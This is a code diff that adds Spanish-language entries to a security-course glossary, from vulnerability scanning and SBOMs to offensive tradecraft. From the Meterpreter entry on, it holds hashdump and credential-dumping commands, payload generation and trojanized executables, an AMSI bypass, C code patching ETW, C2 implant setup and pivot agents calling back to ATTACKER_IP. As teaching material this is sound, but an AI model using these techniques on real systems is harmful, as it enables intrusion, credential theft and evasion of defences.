+      "\n**Workflow moderno de shift-left:**\n" +
+      "```\ndev → Trivy en dev/pre-commit hook\nCI → Trivy en build, fail on HIGH+\nregistry → Trivy scan on push (Harbor, ECR)\ndeploy → admission controller (Kyverno/OPA) verifica firmas cosign\nruntime → Falco detecta anomalías\ncluster → Kubescape mensual\n```\n" +
+      "> 💡 **Trivy es el swiss-army knife moderno** — cubre 70% de casos con una sola tool.\n" +
+      "> ⚠️ **False positives en base images** son comunes — muchas 'HIGH' son vulns en libraries no usadas por la app real. Contextualizar antes de sonar la alarma.",
+    examples: [
+      "GitLab CI: `trivy image --exit-code 1 --severity CRITICAL $CI_REGISTRY_IMAGE` fails builds on critical.",
+      "Log4Shell response: Trivy pushed template en <24hrs, Kubescape añadió NSA Hardening reference en semana.",
+      "GitHub advanced security: Dependabot + Trivy combined coverage.",
+    ],
+    related: ["Análisis de vulnerabilidades", "Image scanning", "Seguridad de Docker e imágenes", "Kubernetes security (RBAC)"],
+  },
+  {
+    id: 317,
+    module: 28,
+    term: "OpenVAS/GVM y Nessus workflow moderno",
+    short: "Los scanners 'legacy' (Nessus, OpenVAS) siguen dominantes en enterprise compliance. Cuándo y cómo usarlos vs. nuclei.",
+    detail:
+      "Nuclei es superior en velocidad y bug hunting, pero **Nessus y OpenVAS** siguen siendo estándar en enterprise por:\n" +
+      "• **Compliance scanning** (PCI-DSS, HIPAA, DISA STIGs) — requerido en auditorías\n" +
+      "• **Authenticated scans** con credentials para checks internos (patches, config)\n" +
+      "• **Reporting profesional** para clientes que esperan Nessus-style reports\n" +
+      "\n**Nessus (Tenable, comercial):**\n" +
+      "\nProduct suite:\n" +
+      "• **Nessus Essentials** — free, 16 IPs, sin compliance templates.\n" +
+      "• **Nessus Professional** — ~$3500/año, unlimited IPs, todas las policies.\n" +
+      "• **Tenable.io / Tenable.sc** — cloud/on-prem plataforma enterprise.\n" +
+      "\n**Types of scans:**\n" +
+      "```\nBasic Network Scan          # discovery + vulns unauth\nAdvanced Scan               # custom, full control\nCredentialed Patch Audit    # con SSH/SMB creds → checks internos\nCompliance Scan             # DISA STIGs, CIS Benchmarks, PCI-DSS\nWeb Application Test        # crawler + SAST-like checks\n```\n" +
+      "\n**Credentialed scan value:**\nSin creds ves ~30% de vulns (banner-based). Con creds ves 100% (patch levels, misconfigs, weak configs). Diferencia enorme.\n" +
+      "\n**OpenVAS / Greenbone Vulnerability Manager (GVM):**\nFork de Nessus 3 (última versión open source, 2005). Mantenido por Greenbone. Community Edition gratis.\n" +
+      "\n**Instalación (Docker):**\n" +
+      "```bash\ndocker run -d -p 9392:9392 --name gvm immauss/openvas\n# Web UI en https://localhost:9392\n```\n" +
+      "\n**Feeds:**\n" +
+      "• **GCF** (Community Feed) — gratis, NVTs (Network Vulnerability Tests) básicos.\n" +
+      "• **GEF** (Enterprise Feed) — paid, más NVTs + compliance profundo.\n" +
+      "\n**GVM workflow (CLI vía `gvm-cli`):**\n" +
+      "```bash\n# Crear target\ngvm-cli --gmp-username admin --gmp-password admin socket --xml \\\n  '<create_target><name>target</name><hosts>10.0.0.5</hosts></create_target>'\n\n# Crear task (scan config = 'Full and fast')\n# ... iterar por API o GUI\n```\n" +
+      "\n**Comparación práctica:**\n" +
+      "| | Nessus | OpenVAS/GVM | Nuclei |\n" +
+      "|---|---|---|---|\n" +
+      "| Costo | $$$ | Gratis | Gratis |\n" +
+      "| Compliance templates | ✅ (DISA STIGs, PCI, HIPAA) | ✅ (limitados) | ❌ |\n" +
+      "| Credentialed scans | ✅ excelente | ✅ ok | ❌ (solo unauth) |\n" +
+      "| Speed | Medio | Lento | Muy rápido |\n" +
+      "| Web CVEs modernas | Ok, lag | Lag | Actualización diaria |\n" +
+      "| Bug hunting | Ok | Ok | Excelente |\n" +
+      "| Enterprise reporting | ✅ estándar | Ok | Requiere post-processing |\n" +
+      "\n**Workflow enterprise combinado:**\n" +
+      "1. **Nuclei** en bug hunting / recon inicial (fast, web-focused).\n" +
+      "2. **Nessus/OpenVAS** en assessment interno con creds (compliance + coverage).\n" +
+      "3. **Trivy/Grype** en containers.\n" +
+      "4. **Manual pentest** para business logic + advanced.\n" +
+      "\n**Rapid7 Nexpose / InsightVM:**\nOtro heavyweight enterprise. Menos usado que Nessus fuera de mercados verticales.\n" +
+      "> 💡 En un pentest engagement, **Nessus authenticated scan** cubre 80% del compliance framework requirements automáticamente.\n" +
+      "> ⚠️ False positives comunes en Nessus/OpenVAS (~10-20%). Requiere validation manual antes de reportar.",
+    examples: [
+      "Enterprise: 'certificate PCI-DSS ASV scan' — Tenable/Qualys certified.",
+      "OSCP no permite scanners automatizados como Nessus — solo herramientas del CLI.",
+      "GVM community edition + custom NVTs para checks propietarios.",
+    ],
+    related: ["Análisis de vulnerabilidades", "Nuclei y templates modernos", "CVSS 4.0 y EPSS", "Container y Kubernetes vulnerability scanning"],
+  },
+  {
+    id: 318,
+    module: 28,
+    term: "SBOM, SCA moderna y supply chain scanning",
+    short: "Software Bill of Materials + Software Composition Analysis. Post-Log4Shell, es requerimiento legal en muchos sectores.",
+    detail:
+      "**SBOM** (*Software Bill of Materials*) es el 'inventario nutricional' del software: lista todos los componentes (dependencies transitivas incluidas), sus versiones y proveedores. **SCA** (*Software Composition Analysis*) es el análisis de esa lista contra CVEs.\n" +
+      "\n**Post-SolarWinds (2020) + Log4Shell (2021)**, EEUU (Executive Order 14028), UE (NIS2), y sectores regulados (healthcare, finance) **requieren SBOM** en delivery de software.\n" +
+      "\n**Formatos estándar:**\n" +
+      "| Formato | Origen | Uso |\n" +
+      "|---|---|---|\n" +
+      "| **CycloneDX** | OWASP | Más popular, extensible, VEX-friendly |\n" +
+      "| **SPDX** | Linux Foundation | Más viejo, licencia-focused |\n" +
+      "| **SWID** | ISO/IEC 19770-2 | Software identification tags |\n" +
+      "\n**Generación de SBOM:**\n" +
+      "```bash\n# Syft (Anchore) — el más versátil\nsyft nginx:1.20 -o cyclonedx-json > nginx-sbom.json\nsyft /path/to/project -o spdx-json > project-sbom.json\n\n# Trivy\ntrivy image --format cyclonedx nginx:1.20 > sbom.json\n\n# CycloneDX CLI\ncyclonedx-cli convert --input-file input.spdx --output-format json\n\n# Language-specific\nnpm sbom --sbom-format=cyclonedx    # npm 10+\nmvn cyclonedx:makeAggregateBom      # Maven\n```\n" +
+      "\n**Análisis (SCA) del SBOM:**\n" +
+      "```bash\n# Grype contra SBOM\ngrype sbom:nginx-sbom.json\n\n# Trivy SBOM scan\ntrivy sbom nginx-sbom.json\n\n# Dependency-Track (OWASP, self-hosted)\ncurl -X POST 'https://dtrack.example.com/api/v1/bom' \\\n  -H 'X-Api-Key: KEY' \\\n  -F 'project=uuid' \\\n  -F 'bom=@nginx-sbom.json'\n```\n" +
+      "\n**Herramientas SCA populares:**\n" +
+      "\n**Enterprise / SaaS:**\n" +
+      "• **Snyk** — best UX, PR integration fuerte\n" +
+      "• **GitHub Dependabot** — free en GitHub public repos\n" +
+      "• **Sonatype Nexus / Lifecycle** — legal + license compliance\n" +
+      "• **JFrog Xray** — integra con Artifactory\n" +
+      "• **Mend (WhiteSource)** — enterprise pesado\n" +
+      "• **Veracode SCA** — enterprise\n" +
+      "\n**Open source:**\n" +
+      "• **OWASP Dependency-Check** — el clásico, integrable en pipelines\n" +
+      "• **OWASP Dependency-Track** — self-hosted SBOM + tracking + notifications\n" +
+      "• **Grype + Syft** — combo moderno de Anchore\n" +
+      "• **Trivy** — todo-en-uno\n" +
+      "\n**VEX (Vulnerability Exploitability eXchange):**\n" +
+      "\nProblema: la lib X en tu SBOM tiene CVE-2023-1234, pero **NO usás la function afectada**. El vuln existe pero no es explotable en tu context.\n" +
+      "\nVEX es una declaración estándar: *'para esta CVE en este componente, mi status es not_affected because {reason}'*.\n" +
+      "```json\n{\n  \"vulnerabilities\": [{\n    \"id\": \"CVE-2023-1234\",\n    \"analysis\": {\n      \"state\": \"not_affected\",\n      \"justification\": \"vulnerable_code_not_in_execute_path\",\n      \"detail\": \"App doesn't use libX.deserialize() function\"\n    }\n  }]\n}\n```\n" +
+      "Elimina alertas false positive at scale.\n" +
+      "\n**Threat intel enrichment:**\n" +
+      "• **VulnCheck** — cross-references CVE + EPSS + KEV + exploit availability\n" +
+      "• **First.org EPSS** — probabilidad de explotación\n" +
+      "• **CISA KEV** — confirmed exploited in wild\n" +
+      "\n> 💡 **El Federal Government US requiere SBOM en todas las adquisiciones de software desde 2023** (EO 14028). Sector privado siguió.\n" +
+      "> ⚠️ SBOM sin update es peor que no tener: la CVE nueva del mes no aparece. Automatizar generation en cada release.",
+    examples: [
+      "Post-SolarWinds: >30 países legislaron requerimientos SBOM en gov procurement.",
+      "OWASP Dependency-Track self-hosted: dashboards para tracking de vulns per project across time.",
+      "npm 10 nativo SBOM: `npm sbom` genera CycloneDX out-of-the-box.",
+    ],
+    related: ["Análisis de vulnerabilidades", "CVSS 4.0 y EPSS", "Vulnerable and Outdated Components", "Nuclei y templates modernos"],
+  },
 
   // ── M29 · Metasploit Framework ───────────────────────────────────────────
   {
@@ -3158,6 +3933,232 @@ export const DEFINITIONS: ConceptDefinition[] = [
       "Crear shellcode para inyectar en un exploit propio.",
     ],
     related: ["Payloads y Meterpreter", "Arquitectura de Metasploit", "PowerShell ofensivo"],
+  },
+  {
+    id: 324,
+    module: 29,
+    term: "Meterpreter avanzado: migrate, extensions, priv escalation",
+    short: "Sessions Meterpreter con extensions (kiwi, incognito, priv), migrate a proceso estable, portfwd/route, hashdump — el arsenal post-exploitation.",
+    detail:
+      "**Meterpreter** es el payload flagship de Metasploit. Corre in-memory (evita AV disk detection), con extensions modulares cargables on-demand.\n" +
+      "\n**Comandos core:**\n" +
+      "```\nsysinfo              # OS, arch, hostname\ngetuid               # user actual\ngetprivs             # privileges del token\nps                   # process list\nmigrate <PID>        # move a otro proceso (typically explorer.exe, svchost.exe)\nsysinfo              # info del target\nhashdump             # dump SAM (requiere SYSTEM)\nkeyscan_start        # keylogger\nkeyscan_dump\nscreenshot           # screenshot\nrun autoroute -s 10.0.0.0/24    # pivoting\nportfwd add -l 5555 -p 3389 -r 10.0.0.5   # port forward\nload kiwi            # load mimikatz extension\n```\n" +
+      "\n**Extensiones críticas:**\n" +
+      "\n**kiwi** (Mimikatz integrado):\n" +
+      "```\nload kiwi\ncreds_all            # todos los creds (passwords, hashes, kerberos)\nlsa_dump_sam         # SAM hashes\nlsa_dump_secrets     # LSA secrets\ngolden_ticket_create # forge Kerberos golden ticket\n```\n" +
+      "\n**incognito** (token manipulation):\n" +
+      "```\nload incognito\nlist_tokens -u       # tokens de usuarios disponibles\nimpersonate_token DOMAIN\\admin   # impersonate → efectivo admin\nsteal_token <PID>    # steal token de un proceso admin\n```\n" +
+      "\n**priv** (privilege escalation attempts):\n" +
+      "```\nload priv\ngetsystem            # intenta 4 métodos automáticos de escalación a SYSTEM\ngetsystem -t 3       # específico técnica 3 (TokenDup)\n```\n" +
+      "\n**Migrate — por qué es CRÍTICO:**\nEl proceso inicial (from exploit) suele ser inestable (crash cuando el user cierra Adobe Reader del phishing). Migrate a un proceso long-running:\n" +
+      "```\nps -A x86 -S explorer.exe     # buscar\nmigrate 1234                   # PID de explorer.exe\n```\n\n**Post-modules (post-exploitation catálogo):**\n" +
+      "```\nrun post/windows/gather/hashdump\nrun post/windows/gather/checkvm\nrun post/windows/gather/credentials/credential_collector\nrun post/multi/recon/local_exploit_suggester\nrun post/multi/manage/autoroute\n```\n" +
+      "\n**Persistence (post-modules):**\n" +
+      "```\nrun persistence -A -S -U -i 60 -p 4444 -r 10.0.0.100   # deprecado\n# Preferir moderno:\nrun post/windows/manage/persistence_exe\n```\nGeneran Registry Run keys, Scheduled Tasks, WMI subscriptions. Estas son **red flags obvias** — detectable por AV/EDR moderno.\n" +
+      "\n**Anti-forensics:**\n" +
+      "```\ntimestomp -m \"01/01/2020 00:00:00\" file.txt   # modificar timestamps\nclearev                                        # borra Windows event logs (⚠️ ruidoso)\n```\n" +
+      "\n**Modernidad**: Meterpreter es **detectado por casi todo EDR moderno** (Defender for Endpoint, CrowdStrike, SentinelOne). Para engagements realistas, se usan alternativas modernas (Sliver, Havoc) o custom implants. Meterpreter sigue rey en OSCP y labs.\n" +
+      "> 💡 **`migrate` PRIMERO** siempre. Un session muerto = perdiste el foothold.\n" +
+      "> ⚠️ `clearev` y `hashdump` triggering audit rules obvias. Priorizar operational security over convenience.",
+    examples: [
+      "OSCP: `migrate` + `hashdump` es workflow standard post-getsystem.",
+      "getsystem falla contra Win 10+ con UAC. Métodos manuales requeridos.",
+      "kiwi golden_ticket: creds persistentes hasta cambio de krbtgt password (raro).",
+    ],
+    related: ["Payloads y Meterpreter", "Post-explotación", "Payloads y Meterpreter", "AAA (Autenticación, Autorización, Accounting)"],
+  },
+  {
+    id: 325,
+    module: 29,
+    term: "msfvenom y payload generation moderna",
+    short: "msfvenom genera payloads en 30+ formatos (exe, elf, apk, jsp, py, war, macho, hta). Encoding + obfuscation para evasión básica.",
+    detail:
+      "**msfvenom** es el generator de payloads de Metasploit — reemplazo de msfpayload+msfencode desde 2015.\n" +
+      "\n**Syntax básica:**\n" +
+      "```bash\nmsfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>\n```\n" +
+      "\n**Payloads más comunes:**\n" +
+      "```\nwindows/x64/meterpreter/reverse_tcp        # 64-bit Windows Meterpreter\nwindows/meterpreter/reverse_https          # HTTPS callback (evade DPI)\nlinux/x64/shell_reverse_tcp                # Linux basic shell\nlinux/x64/meterpreter/reverse_tcp\nphp/meterpreter/reverse_tcp                # PHP webshell\njava/jsp_shell_reverse_tcp                 # JSP shell (Tomcat)\nandroid/meterpreter/reverse_tcp            # APK payload\nosx/x64/shell_reverse_tcp                  # macOS\ncmd/unix/reverse_python                    # Python one-liner\n```\n" +
+      "\n**Staged vs Stageless:**\n" +
+      "| | Staged (`meterpreter/reverse_tcp`) | Stageless (`meterpreter_reverse_tcp` — subrayado) |\n" +
+      "|---|---|---|\n" +
+      "| Size | Pequeño stub (~200 bytes) | Todo el DLL (~1MB) |\n" +
+      "| Callback | Descarga stage 2 al conectar | Todo incluido |\n" +
+      "| Firewall | Requiere 2 sesiones separadas | Una conexión |\n" +
+      "| AV detection | Stub es signatureable | Payload full firmable |\n" +
+      "\nStageless preferido en engagements egress-restricted; staged mejor evasión inicial.\n" +
+      "\n**Formatos comunes:**\n" +
+      "```\n-f exe        # Windows PE executable\n-f exe-only   # sin envoltorio de MSF template (más stealth)\n-f elf        # Linux ELF\n-f raw        # shellcode raw\n-f c          # shellcode en formato C\n-f csharp     # shellcode C#\n-f psh        # PowerShell script\n-f hta-psh    # HTA (HTML app) — vector clásico\n-f vbs        # VBScript\n-f war        # Java Web ARchive (Tomcat)\n-f apk        # Android package\n```\n" +
+      "\n**Encoders (deprecados vs modernos):**\n" +
+      "\n**Encoders clásicos de MSF** (todos detectados por AV moderno):\n" +
+      "```\n-e x86/shikata_ga_nai   # polymorphic — el más popular, MUY detectado en 2024\n-e x86/alpha_upper       # ASCII printable\n-e x64/xor               # simple XOR\n-i 10                     # 10 iteraciones\n```\n\n**Realidad 2024**: `shikata_ga_nai` es **detectado por firma** en Defender/CrowdStrike/SentinelOne. Sirve para bypass básico o labs, no para engagements reales.\n" +
+      "\n**Templates ejecutables:**\n" +
+      "```bash\nmsfvenom -p ... -x /path/to/legit.exe -k -f exe   # inyecta en legit exe\n# -k keeps original functionality → user no nota nada\n```\n" +
+      "\n**Alternativas modernas para evasión real:**\n" +
+      "\n**Donut** — shellcode generator con encryption AES:\n" +
+      "```bash\ndonut -f payload.exe -o payload.bin\n# Después inyectar bin en un loader custom en Nim/Rust/Go\n```\n" +
+      "\n**ScareCrow** — shellcode loader con syscalls directas, evasion Defender:\n" +
+      "```bash\nScareCrow -I payload.bin -Loader excel\n```\n" +
+      "\n**PEzor** — packs de PEs con anti-analysis, unhook AMSI/ETW.\n" +
+      "\n**Custom loaders en Nim/Rust/Go** (2023-2025 estándar): compilan a binaries menos detectables, syscalls directas, sin dependencia .NET (evita ETW/AMSI).\n" +
+      "\n**Handler setup (msfconsole):**\n" +
+      "```\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_https\nset LHOST 0.0.0.0\nset LPORT 443\nset ExitOnSession false\nexploit -j\n```\n" +
+      "\n**MSF DB (workspace/creds/notes tracking):**\n" +
+      "```\nworkspace -a engagement-01\ndb_nmap -sV -sC target\nservices\nvulns\ncreds -u admin\nnotes\n```\n" +
+      "> 💡 Para **OSCP** msfvenom basic es suficiente. Para **red team real** debés compilar tus propios loaders.\n" +
+      "> ⚠️ **NO usar `-e shikata_ga_nai` esperando evasión** en 2024 — está signaturado hace años. Detecta hasta Defender free.",
+    examples: [
+      "OSCP: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f exe -o payload.exe`.",
+      "Red team real: msfvenom → donut → loader Nim custom → Defender miss.",
+      "Golden path 2024: reverse_https en 443 (bypass DPI firewall + parece tráfico normal).",
+    ],
+    related: ["Arquitectura de Metasploit", "Exploit y Payload", "Meterpreter avanzado: migrate, extensions, priv escalation", "Sliver, Havoc y C2 modernos (post-Cobalt Strike)"],
+  },
+  {
+    id: 326,
+    module: 29,
+    term: "AV/EDR evasion moderna: AMSI, ETW, syscall directas",
+    short: "AV firma-based (2010s) → EDR behavioral (2020s). Evasión moderna requiere unhook, patch AMSI/ETW, y syscalls directas via user-mode.",
+    detail:
+      "En 2024 el paradigma cambió: **firma-based AV** (Defender clásico) fue reemplazado por **EDR** (Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Cortex XDR) que **monitorea comportamiento** en runtime.\n" +
+      "\n**Cómo funciona EDR moderno:**\n" +
+      "1. **AMSI** (Antimalware Scan Interface) — Windows API que apps invocan para escanear strings antes de ejecutar (PowerShell, VBS, JS, .NET).\n" +
+      "2. **ETW** (Event Tracing for Windows) — telemetría kernel-mode (process creation, DLL loads, network, registry).\n" +
+      "3. **Kernel drivers** que hookean syscalls y monitor system calls.\n" +
+      "4. **Cloud lookups** — hashes de binaries checked contra threat intel en tiempo real.\n" +
+      "5. **ML behavioral analysis** — patterns de comportamiento anómalos.\n" +
+      "\n**Técnicas de evasion modernas:**\n" +
+      "\n**1. AMSI Bypass:**\n" +
+      "```powershell\n# Classic — MUY detectado hoy\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Moderno — hardware breakpoint\n# https://github.com/RythmStick/AMSITrigger + moderno con syscall\n```\nParchar `amsiInitFailed = true` en memoria hace que AMSI reporte error y skip scanning.\n" +
+      "\n**2. ETW Bypass:**\n" +
+      "```c\n// Patch de la primera instrucción de ntdll!EtwEventWrite con `ret`\nvoid patch_etw() {\n    HMODULE ntdll = GetModuleHandle(\"ntdll.dll\");\n    void* etw = GetProcAddress(ntdll, \"EtwEventWrite\");\n    DWORD old;\n    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);\n    *((unsigned char*)etw) = 0xC3;   // ret\n    VirtualProtect(etw, 1, old, &old);\n}\n```\nSin ETW, muchos EDR pierden visibilidad de kernel events.\n" +
+      "\n**3. Syscalls directas (Hell's Gate, Halo's Gate):**\nEDR hookea funciones user-mode de ntdll.dll (NtCreateThreadEx, NtAllocateVirtualMemory). Bypasses:\n" +
+      "```\n1. Leer ntdll.dll DESDE DISK (no la in-memory hookeada)\n2. Extraer syscall numbers de las functions\n3. Invocar syscalls directamente vía asm (`syscall` instruction)\n```\nHerramientas: **SysWhispers2/3**, **Hell's Gate**, **Halo's Gate**, **Recycled Gate**.\n" +
+      "\n**4. Unhooking ntdll:**\n" +
+      "```c\n// Sobrescribir ntdll.dll en memoria con la copia limpia del disk\nvoid unhook_ntdll() {\n    HANDLE file = CreateFileA(\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", ...);\n    HANDLE map = CreateFileMappingA(file, ...);\n    void* clean_ntdll = MapViewOfFile(map, ...);\n    // Overwrite .text section de ntdll cargada con la del disk\n}\n```\n" +
+      "\n**5. Process injection moderno:**\n" +
+      "En vez de `CreateRemoteThread` (detectado), usar:\n" +
+      "```\n- Early Bird APC injection (queued antes de que EDR hookee)\n- Process Doppelgänging (TxF transactions)\n- Process Herpaderping (modificar file entre create + resume)\n- Module Stomping (write en DLL legítimo cargado)\n- Threadless injection (no crear thread nuevo)\n```\n" +
+      "\n**6. BYOVD** (Bring Your Own Vulnerable Driver):\nUn driver firmado (legit sign) pero vulnerable permite kernel-mode operations. Ejemplos:\n" +
+      "```\ngmer.sys, procexp.sys, iqvw64e.sys (Intel), Vulnerable_Driver_Blocklist evasion\n```\nHerramientas: **KDMapper**, **EDRSandBlast**, **BadZure**.\n" +
+      "\n**Frameworks / kits modernos:**\n" +
+      "• **ScareCrow** — loader con syscalls + module stomping\n" +
+      "• **PEzor** — packer con anti-analysis\n" +
+      "• **Freeze.rs** — Rust loader con unhook\n" +
+      "• **NimShellcodeInjector, Nimplant** — Nim payloads menos detectados por training data de EDR (más nuevo)\n" +
+      "\n**MITRE ATT&CK reference:**\n" +
+      "• T1562.001 Impair Defenses: Disable/Modify Tools (AMSI, ETW)\n" +
+      "• T1055 Process Injection (12+ sub-técnicas)\n" +
+      "• T1218 Signed Binary Proxy Execution (BYOVD relacionado)\n" +
+      "\n> 💡 **Red team senior job market 2024**: dominar syscalls directas + unhooking + Nim/Rust loaders es el skillset esperado.\n" +
+      "> ⚠️ Evasion techniques evolucionan rápido. Lo que funciona en Junio deja de funcionar en Octubre. **Continuous research required**.",
+    examples: [
+      "Sliver framework: syscalls directas + Nim loader out-of-box.",
+      "CrowdStrike blocked 99% de shikata_ga_nai en 2020; hoy detecta >99% de Meterpreter payloads default.",
+      "BadUSB + BYOVD combined: bypass total del EDR pero requiere physical access.",
+    ],
+    related: ["Meterpreter avanzado: migrate, extensions, priv escalation", "msfvenom y payload generation moderna", "Sliver, Havoc y C2 modernos (post-Cobalt Strike)", "PowerShell ofensivo"],
+  },
+  {
+    id: 327,
+    module: 29,
+    term: "Sliver, Havoc y C2 modernos (post-Cobalt Strike)",
+    short: "Sliver (open source, Go) y Havoc (open source, Rust/C++) son los sucesores libres del Cobalt Strike comercial. Metasploit se quedó atrás para red team real.",
+    detail:
+      "**Cobalt Strike** ($3500+/año) fue el C2 estándar de red team profesional durante 2015-2020. Cracked versions inundaron el ecosystem malicioso post-2020 (Conti, Ryuk usaban CS crackeado). Alternativas open-source modernas cambiaron el juego.\n" +
+      "\n**Sliver (BishopFox, 2020):**\nEscrito en Go. Cross-platform (Linux, Windows, macOS). Client CLI + server + implants (beacons).\n" +
+      "\n**Features:**\n" +
+      "• **Multi-transport**: mTLS, HTTP(S), DNS, WireGuard, TCP pivots\n" +
+      "• **Multiplayer** (varios operators sobre mismo team server)\n" +
+      "• **Extension system** con módulos precompilados\n" +
+      "• **Post-ex modules**: token manipulation, portfwd, procdump, screenshot, execute-assembly\n" +
+      "• **Sacrificial process** (spawn/inject)\n" +
+      "\n**Instalación + uso:**\n" +
+      "```bash\nsudo bash -c 'wget https://sliver.sh/install; bash install'\nsliver-server              # inicia server\nsliver                     # cliente\n\n# En sliver client\ngenerate --os linux --arch amd64 --mtls 10.0.0.1:8888 --save /tmp/implant\nmtls --lport 8888\n# Ejecutar implant en target → aparece beacon\n\nbeacons                    # list active\nuse <beacon-id>\ninfo\nshell\nls\nprocdump --pid 1234\n```\n" +
+      "\n**Havoc (C5pider, 2022):**\nRust/C++/Python. GUI-first (a diferencia de Sliver CLI). UI similar a Cobalt Strike (deliberado).\n" +
+      "\n**Features:**\n" +
+      "• **Demon agent** (implant) escrito en C\n" +
+      "• Modular listener system (HTTP, HTTPS, SMB)\n" +
+      "• **BOF support** (Beacon Object Files — código C in-process de CS)\n" +
+      "• Python scripting engine para automation\n" +
+      "\n**Merlin (2018):**\nC2 experimental en Go. HTTP/2 transport (unusual, hard to detect en 2018).\n" +
+      "\n**Mythic (2020):**\nFramework multi-agent. Diferente approach: **múltiples C2 implants** (Apollo, Poseidon, Nimplant) plug-in en la misma plataforma. Docker-native.\n" +
+      "\n**PoshC2 (2019):**\nPowerShell-based, community driven. Todavía usado en engagements Windows-heavy.\n" +
+      "\n**Cobalt Strike (commercial):**\nSigue siendo #1 en red team profesional que tiene budget. Feature más maduro:\n" +
+      "• **Malleable C2 profiles** — customizar cada byte del tráfico\n" +
+      "• **Aggressor Script** — automation scripting\n" +
+      "• **BOFs** (Beacon Object Files) — extender beacon in-process\n" +
+      "• **Team collaboration** madura\n" +
+      "• Support de HelpSystems\n" +
+      "\n**Comparación práctica:**\n" +
+      "| | Cobalt Strike | Sliver | Havoc | Metasploit |\n" +
+      "|---|---|---|---|---|\n" +
+      "| Costo | $$$$ | Gratis | Gratis | Gratis |\n" +
+      "| Idioma | Java/C | Go | Rust/C++ | Ruby |\n" +
+      "| Detection (2024) | Alta (crackeado + IoC) | Media | Media-baja | Alta (Meterpreter signaturado) |\n" +
+      "| BOF support | ✅ nativo | Parcial | ✅ | ❌ |\n" +
+      "| Multiplayer | ✅ | ✅ | ✅ | Limitado |\n" +
+      "| Docs / community | Excelente (privada) | Buena, growing | Growing | Enorme |\n" +
+      "| Learning curve | Media | Baja | Media-alta | Baja |\n" +
+      "\n**Contexto legal:**\nUsar C2 sin autorización explícita del owner del target es **ilegal en la mayoría de jurisdicciones**. Solo en:\n" +
+      "• Engagements con contrato firmado + scope explícito\n" +
+      "• Red team interno con approval de management\n" +
+      "• CTF/HTB/labs propios\n" +
+      "• Investigación con targets propios\n" +
+      "\n**Tendencia 2024-2025**: mucho movimiento a **custom C2 in-house** (compilados propios para evitar signatures conocidas), especialmente en top-tier APTs y state-sponsored.\n" +
+      "> 💡 **Sliver** es lo que aprender en 2024 si tu carrera es red team.\n" +
+      "> ⚠️ Todos estos frameworks son **flagged como malware por AV/EDR**. Nunca ejecutar en producción no autorizada.",
+    examples: [
+      "APT29 (Cozy Bear): usa custom C2 (Cobalt Strike modificado + implants propios).",
+      "Conti / Ryuk ransomware: Cobalt Strike crackeado como stager principal.",
+      "Sliver 2024: adoption creciente en pentest firms de tier 2-3 por ratio calidad/precio.",
+    ],
+    related: ["Arquitectura de Metasploit", "Meterpreter avanzado: migrate, extensions, priv escalation", "msfvenom y payload generation moderna", "AV/EDR evasion moderna: AMSI, ETW, syscall directas"],
+  },
+  {
+    id: 328,
+    module: 29,
+    term: "Pivoting y proxy chains con Ligolo-ng y Chisel",
+    short: "Post-compromise, atravesar segmentos de red aislados. Ligolo-ng (userland tun/tap) reemplazó a proxychains/SSH tunnels en 2023.",
+    detail:
+      "El **pivoting** es alcanzar redes internas desde una máquina comprometida en la DMZ. El paradigma moderno cambió de proxychains lento a userland VPNs.\n" +
+      "\n**Escenario típico:**\n" +
+      "```\n[Atacante] → [Internet] → [DMZ machine, comprometido] → [red interna 192.168.1.0/24]\n```\nEl atacante quiere escanear/explotar 192.168.1.0/24 sin exponer todo.\n" +
+      "\n**Método clásico 1: SSH port forwarding**\n" +
+      "```bash\n# Local forward: atacante → puerto local 8080 → target interno 192.168.1.5:80\nssh -L 8080:192.168.1.5:80 user@dmz-machine\n\n# Dynamic (SOCKS): atacante crea SOCKS proxy local\nssh -D 9050 user@dmz-machine\n# Uso: proxychains nmap -sT 192.168.1.5\n```\nProblema: requiere SSH creds/access, SOCKS TCP-only (no UDP, no ICMP → sin ping, sin nmap SYN).\n" +
+      "\n**Método clásico 2: proxychains + Metasploit autoroute**\n" +
+      "```\n# En Meterpreter session\nrun autoroute -s 192.168.1.0/24\n\n# Nuevo terminal MSF con proxy socks\nuse auxiliary/server/socks_proxy\nset SRVPORT 9050\nrun\n\n# Nmap externo via socks\nproxychains nmap -sT -Pn 192.168.1.5\n```\nSlow. TCP-only. Sin UDP scans.\n" +
+      "\n**Ligolo-ng (2023, moderno):**\n\nCreator: Nicolas Chatelain. Reemplazo del original Ligolo. **Full userland tun/tap** vía TLS/QUIC.\n" +
+      "\nWorkflow:\n" +
+      "```bash\n# En atacante (proxy server)\n./proxy -selfcert\n\n# En target comprometido (agent)\n./agent -connect ATTACKER_IP:11601 -ignore-cert\n\n# En atacante — configurar routing\nsudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add 192.168.1.0/24 dev ligolo\n\n# Ahora TODO tráfico del atacante a 192.168.1.0/24 pasa via el target\nnmap -sS -sV 192.168.1.5     # Nmap NORMAL, sin proxychains\ncurl http://192.168.1.5      # HTTP normal\nsmbclient //192.168.1.5      # SMB normal\n# Todo funciona: TCP, UDP, ICMP, cualquier protocolo\n```\n" +
+      "\n**Ventajas:**\n" +
+      "• Full TCP + UDP + ICMP support\n" +
+      "• No requiere modificar comandos (no proxychains needed)\n" +
+      "• Muy rápido (native networking)\n" +
+      "• TLS/QUIC encrypted transport\n" +
+      "• Cross-platform (Linux, Windows agent)\n" +
+      "\n**Chisel (2018, sigue muy usado):**\n\nGo binary. HTTP/WebSocket tunneling. Popular en OSCP/HTB.\n" +
+      "```bash\n# En atacante (server)\n./chisel server -p 8080 --reverse\n\n# En target (client, reverse)\n./chisel client ATTACKER:8080 R:socks\n\n# Uso: SOCKS proxy on atacante:1080\nproxychains nmap -sT 192.168.1.5\n```\nRápido y simple pero solo TCP + SOCKS.\n" +
+      "\n**Alternativas específicas:**\n" +
+      "\n**revsocks** (Go): reverse SOCKS con TLS.\n" +
+      "**gost** (Go): swiss-army knife de tunneling — SOCKS5, HTTP proxy, WebSocket, TLS, transparente.\n" +
+      "**iodine**: DNS tunneling (cuando solo DNS sale) — muy lento pero funcional.\n" +
